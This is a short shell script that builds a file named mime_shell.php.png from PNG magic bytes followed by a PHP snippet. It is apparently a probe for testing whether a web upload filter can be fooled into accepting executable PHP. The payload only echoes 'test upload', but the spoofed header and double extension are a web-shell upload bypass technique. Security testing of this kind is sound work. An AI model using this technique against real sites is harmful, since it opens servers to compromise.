#!/bin/sh
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > mime_shell.php.png
echo '<?php echo "test upload"; ?>' >> mime_shell.php.png
